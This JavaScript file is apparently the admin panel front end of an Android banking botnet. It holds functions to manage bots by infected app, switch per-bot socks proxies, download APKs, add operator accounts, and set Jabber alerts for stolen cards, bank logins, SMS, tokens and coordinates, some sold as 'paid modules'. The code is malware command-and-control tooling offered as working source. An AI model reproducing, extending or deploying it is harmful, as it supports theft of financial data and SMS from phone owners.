// js for mods pages

function save_comment(id, type)
{
	var comment = $('#' + type + '-' + id).val()

	ajax_command('panel_save_comment', {'type': type, 'comment': comment, 'id': id}, false)
	$('#button-'+type+'-' + id).hide()
	
	if(comment.trim() == '')
	{
		hide_comment_area('addlink-' + id, type + '-' + id)
	}
}

function save_settings()
{
	var elems = $('textarea[id^="cfg-"]')
	var data = {}
	
	for(var i=0; i<elems.length; i++) 
	{
		var full_id = elems[i].id
		var id = full_id.split('-').pop()
		data[full_id] = $('#' + full_id).val().trim()
	}
	
	ajax_command('panel_save_settings', data, true)
}

function show_comment_area(link, id)
{
	$('#' + id).show()
	$('#' + id).focus()
	$('#' + link).hide()
}

function hide_comment_area(link, id)
{
	$('#' + id).hide()
	$('#' + link).show()
}

function switch_socks(bot_id, param)
{
	// TODO switch socks for bot id ' +bot_id + '; param: ' + param 
}

function apps_show_bots()
{
	var ids = get_selected_elems();

	if(!ids.length)
	{
		msg('Info', 'Select apps first')
		return
	}
	
	var apps = '';
	for (var i = 0; i < ids.length; i++){
		var app = $('a[data-id="' + ids[i] + '"]')[0].innerText;
		if (app.length){
			apps += app + ',';
		}
	}

	go_to_hash("bots", {"appname": apps});
}

function download_apk(name)
{
	download_file({
		cmd: "panel_download_apk",
		name: name,
		'X-Requested-With': 'xmlhttprequest',
	});
}

function add_account()
{
	var login = $("#new_login").val().trim()
	var pass = $("#new_password").val().trim()
	
	if(login == '' || pass == '')
	{
		msg_small('Error', 'Login and password should be filled')
		return
	}

	ajax_command('panel_add_account', {'login': login, 'pass': pass}, true)
}

function jabber_save(do_test)
{
	$('#sms-numbers').removeClass('inputError')
	
	if($('#notifies-sms').prop('checked') && $('#sms-numbers').val().trim() == '')
	{
		$('#sms-numbers').addClass('inputError')
		return
	}
	
	var data = {
		'jabber_login': $('#jabber_login').val().trim(),
		'jabber_pass': $('#jabber_password').val().trim(),
		'jabber_server': $('#jabber_server').val().trim(),
		'jabber_port': $('#jabber_port').val().trim(),
		'jabber_rcp': $('#jabber_rcp').val().trim(),
		'jabber_on_cards': $('#notifies-cards').prop('checked'),
		'jabber_on_banks': $('#notifies-banks').prop('checked'),
		'jabber_on_sms': $('#notifies-sms').prop('checked'),
		'jabber_on_tokens': $('#notifies-tokens').prop('checked'),  // paid module
		'jabber_on_coords': $('#notifies-coords').prop('checked'),  // paid module
		'jabber_notifies_type': $('#notifies-type').val(), // simple/full
		'jabber_sms_numbers': ($('#notifies-sms').prop('checked'))? $('#sms-numbers').val() : '',
	}
	
	ajax_command('panel_jabber_' + ((do_test)? 'test' : 'save'), data, true)
}

function update_jabber_sms_numbers()
{
	if($('#notifies-sms').prop('checked'))
		$('#sms_numbers_block').fadeIn()
	else
		$('#sms_numbers_block').fadeOut()
}






















